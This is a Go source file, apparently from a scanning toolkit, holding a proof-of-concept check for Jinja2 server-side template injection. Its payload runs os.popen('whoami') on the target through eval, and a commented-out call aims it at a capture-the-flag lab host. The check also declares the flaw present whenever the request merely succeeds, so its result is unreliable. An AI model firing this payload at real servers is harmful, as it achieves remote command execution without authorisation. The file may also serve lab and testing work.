package jinja2_SSTI

import (
	"github.com/gocolly/colly"
)

var c = colly.NewCollector()

func PocJinja2(pocUrl string) string {
	poContext := "/?name={%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}%20{%%20if%20c.__name__==%27_IterationGuard%27%20%}%20{{%20c.__init__.__globals__[%27__builtins__%27][%27eval%27](\"__import__(%27os%27).popen(%27whoami%27).read()\")%20}}%20{%%20endif%20%}%20{%%20endfor%20%}"
	payload := pocUrl + poContext
	err := c.Visit(payload)
	if err != nil {
		return "Jinja2 SSTI模板注入漏洞 **不存在"
	}
	return "**** 存在Jinja2 SSTI模板注入漏洞 ****"
}

//func main() {
//	fmt.Println(PocJinja2("http://node4.buuoj.cn:25985/"))
//}
